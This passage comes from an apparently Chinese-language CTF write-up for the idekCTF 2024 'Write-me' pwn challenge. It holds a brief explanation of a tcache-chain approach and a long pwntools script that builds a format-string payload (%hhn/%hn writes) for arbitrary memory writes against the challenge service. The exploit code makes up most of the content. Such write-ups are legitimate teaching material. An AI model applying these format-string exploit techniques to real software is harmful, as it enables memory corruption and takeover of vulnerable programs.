class="hljs-string">&#x27;(cnt=&#x27;</span>+<span class="hljs-built_in">hex</span>(cnt)+<span class="hljs-string">&#x27;)&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                no_offset_id=<span class="hljs-number">0x10</span>*((idx-<span class="hljs-number">1</span>)%<span class="hljs-number">0x10</span>)<br>                <span class="hljs-keyword">if</span> no_offset_id <span class="hljs-keyword">in</span> dictionary:<br>                    payload+=<span class="hljs-string">&#x27;%c&#x27;</span><br>                    cnt+=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span><br>                <span class="hljs-keyword">if</span> dst_dword_id <span class="hljs-keyword">in</span> dictionary:<br>                    payload+=<span class="hljs-string">&#x27;%c&#x27;</span><br>                    cnt+=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span><br><br>challenges=<span class="hljs-built_in">sorted</span>(challenges,key=<span class="hljs-keyword">lambda</span> item: item.val)<br>addr_base=<span class="hljs-number">0x29ef</span><br>addr_chunk=<span class="hljs-number">0xa0</span><br><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> challenges:<br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xffffffff</span>)&gt;item.val:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(item.val-(cnt&amp;<span class="hljs-number">0xffffffff</span>)+<span class="hljs-number">0x100000000</span>)+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=item.val+<span class="hljs-number">0x100000000</span>+(cnt&amp;<span class="hljs-number">0xffffffff00000000</span>)<br>    <span class="hljs-keyword">elif</span> (cnt&amp;<span class="hljs-number">0xffffffff</span>)&lt;item.val:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(item.val-(cnt&amp;<span class="hljs-number">0xffffffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=item.val+(cnt&amp;<span class="hljs-number">0xffffffff00000000</span>)<br>    payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(addr_base-addr_chunk*item.idx)+<span class="hljs-string">&#x27;$n&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Write: &#x27;</span>+<span class="hljs-string">&#x27;idx:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.idx)+<span class="hljs-string">&#x27; val:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.val)+<span class="hljs-string">&#x27;(cnt=&#x27;</span>+<span class="hljs-built_in">hex</span>(cnt)+<span class="hljs-string">&#x27;)&#x27;</span>)<br><br>payload+=<span class="hljs-string">&#x27;Eurus&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] len(payload) = &#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Format string? &#x27;</span>,payload.encode())<br>p.recvuntil(<span class="hljs-string">b&#x27;Eurus&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h1><ul>
+<li><p>既然可以用溢出解决cnt跳过的问题就不需要用unsorted bin和large bin风水了，直接用tcache就行</p>
+</li>
+<li><p>用tcache造一条chain</p>
+<ul>
+<li>%hhn盖low byte写偏移</li>
+<li>%hhn写地址</li>
+</ul>
+<img src="/2024/08/20/idekctf2024-writeme/chain.png" srcset="/img/loading.gif" lazyload class title="chain"></li>
+</ul>
+<h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,sz</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size? &#x27;</span>,<span class="hljs-built_in">str</span>(sz).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><br><span class="hljs-comment">#p=process(&#x27;./write_me&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><br><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-number">0xd60</span>-<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_heap_address</span>(<span class="hljs-params">lens</span>):<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lens):<br>        add(idx+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>        delete(idx+<span class="hljs-number">1</span>)<br>        delete(idx)<br>        add(idx,<span class="hljs-number">0x10</span>)<br>        add(idx+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br><br>prepare_heap_address(<span class="hljs-number">0x100</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,idx</span>):<br>        self.addr=[addr&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>]<br>        self.idx=idx<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> [Dword(self.addr[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,self.idx),Dword(self.addr[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>,self.idx),Dword(self.addr[<span class="hljs-number">2</span>],<span class="hljs-number">4</span>,self.idx)]<br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Value</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,val,idx</span>):<br>        self.val=[val&amp;<span class="hljs-number">0xffff</span>,(val&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>]<br>        self.idx=idx<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> [Dword(self.val[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,self.idx),Dword(self.val[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>,self.idx)]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Challenge</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,val,idx</span>):<br>        self.addr=[Address(addr,idx),Address(addr+<span class="hljs-number">2</span>,idx)]<br>        self.val=Value(val,idx)<br>        self.idx=idx<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dword</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,val,offset,idx</span>):<br>        self.val=val<br>        self.idx=idx<br>        self.offset=offset<br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>challenges=[]<br>val_dwords_group=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;: Write 0x&#x27;</span>)<br>    val=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;to address 0x&#x27;</span>)<br>    addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    challenge=Challenge(addr,val,i)<br>    challenges.append(challenge)<br>    val_dwords_group+=challenge.val.divide()<br><br>payload=<span class="hljs-string">&#x27;&#x27;</span><br>payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">3</span><br>cnt=<span class="hljs-number">3</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_by</span>(<span class="hljs-params">val</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xff</span>)&gt;=val:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val+<span class="hljs-number">0x100</span>-(cnt&amp;<span class="hljs-number">0xff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+<span class="hljs-number">0x100</span>+(cnt&amp;<span class="hljs-number">0xffffffffffffff00</span>)<br>    <span class="hljs-keyword">else</span>:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val-(cnt&amp;<span class="hljs-number">0xff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+(cnt&amp;<span class="hljs-number">0xffffffffffffff00</span>)<br>    pl+=<span class="hljs-string">&#x27;%hhn&#x27;</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_dword</span>(<span class="hljs-params">val</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xffff</span>)&gt;=val:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val+<span class="hljs-number">0x10000</span>-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+<span class="hljs-number">0x10000</span>+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    <span class="hljs-keyword">else</span>:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    pl+=<span class="hljs-string">&#x27;%hn&#x27;</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_dword_with_off</span>(<span class="hljs-params">val,off</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xffff</span>)&gt;=val:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val+<span class="hljs-number">0x10000</span>-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+<span class="hljs-number">0x10000</span>+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    <span class="hljs-keyword">else</span>:<br>        pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(val-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=val+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>    pl+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(off)+<span class="hljs-string">&#x27;$hn&#x27;</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_addr</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">global</span> cnt<br>    pl=<span class="hljs-string">&#x27;&#x27;</span><br>    addr_dwords=<span class="hljs-built_in">sorted</span>(addr.divide(),key=<span class="hljs-keyword">lambda</span> item: item.val)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> addr_dwords:<br>        pl+=write_by(item.offset)<br>        pl+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">2</span><br>        cnt+=<span class="hljs-number">2</span><br>        pl+=write_dword(item.val)<br>        pl+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">2</span><br>        cnt+=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> pl<br><br><span class="hljs-keyword">for</span> chal <span class="hljs-keyword">in</span> challenges:<br>   payload+=write_addr(chal.addr[<span class="hljs-number">0</span>])<br>   payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">8</span><br>   cnt+=<span class="hljs-number">8</span><br>   payload+=write_addr(chal.addr[<span class="hljs-number">1</span>])<br>   payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">8</span><br>   cnt+=<span class="hljs-number">8</span><br><br>log.info(<span class="hljs-string">&#x27;Write addresses finished&#x27;</span>)<br><br>addr_base_off=<span class="hljs-number">1</span><br>addr_chunk=<span class="hljs-number">0x20</span><br>val_dwords_group=val_dwords_group<br><span class="hljs-keyword">for</span> dword <span class="hljs-keyword">in</span> val_dwords_group:<br>    payload+=write_dword_with_off(dword.val,addr_base_off+addr_chunk*(dword.idx*<span class="hljs-number">2</span>+dword.offset//<span class="hljs-number">2</span>))<br><br>log.info(<span class="hljs-string">&#x27;Write values finished&#x27;</span>)<br><br>payload+=<span class="hljs-string">&#x27;Eurus&#x27;</span><br>log.info(<span class="hljs-string">&#x27;len(payload) = &#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Format string? &#x27;</span>,payload.encode())<br>p.recvuntil(<span class="hljs-string">b&#x27;Eurus&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/08/20/idekctf2024-writeme/flag.png" srcset="/img/loading.gif" lazyload class title="flag">
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/WP/" class="category-chain-item">WP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024 idekCTF Write-me wp</div>
+      <div>http://akaieurus.github.io/2024/08/20/idekctf2024-writeme/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/23/cve-2022-1015/" title="CVE-2022-1015 nftables栈溢出">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CVE-2022-1015 nftables栈溢出</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/16/jqctf2024-badlist/" title="2024 京麒CTF badlist wp">
+                        <span class="hidden-mobile">2024 京麒CTF badlist wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
